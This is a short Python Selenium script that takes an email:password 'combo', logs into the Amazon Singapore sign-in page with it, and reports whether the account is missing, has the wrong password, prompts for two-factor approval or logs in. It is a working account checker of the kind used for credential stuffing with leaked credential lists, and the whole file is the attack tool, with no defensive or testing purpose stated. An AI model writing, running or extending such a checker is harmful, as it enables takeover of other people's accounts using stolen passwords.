from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
import time

data = input("INSERT YOUR COMBO-->")


def amazon(data: str):
    MAIL, PASS = data.split(':')
    chrome_options = Options()
    chrome_options.add_argument('--no-sandbox')
    chrome_options.add_argument('--disable-dev-shm-usage')
    driver = webdriver.Chrome(options=chrome_options)
    # // OPEN AMAZON //
    driver.get(
        'https://www.amazon.sg/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https://www.amazon.sg/?_encoding=UTF8&ref_=navm_hdr_signin&openid.identity=http://specs.openid.net/auth/2.0/identifier_select&openid.assoc_handle=anywhere_v2_sg&openid.mode=checkid_setup&openid.claimed_id=http://specs.openid.net/auth/2.0/identifier_select&openid.ns=http://specs.openid.net/auth/2.0&'
    )
    time.sleep(3)
    email = driver.find_element(By.ID, 'ap_email_login')
    time.sleep(3)
    email.send_keys(MAIL)
    pwd = driver.find_element(By.ID, 'ap_password')
    time.sleep(5)
    pwd.send_keys(PASS)
    time.sleep(3)
    login = driver.find_element(By.ID, 'auth-signin-button')
    time.sleep(3)
    login.submit()

    if 'No account found' in driver.page_source:
        print('ACCOUNT NOT FOUND')
    elif 'Your password is incorrect' in driver.page_source:
        print('PASSWORD MISSMATCH')
    elif 'approve the notification' in driver.page_source:
        print('LOGGED IN 2FTA')
    elif 'Logout' in driver.page_source:
        print('LOGGED IN SUCCESS')
    else:
        print('Failed')
    driver.delete_all_cookies()
    driver.close()


amazon(data)
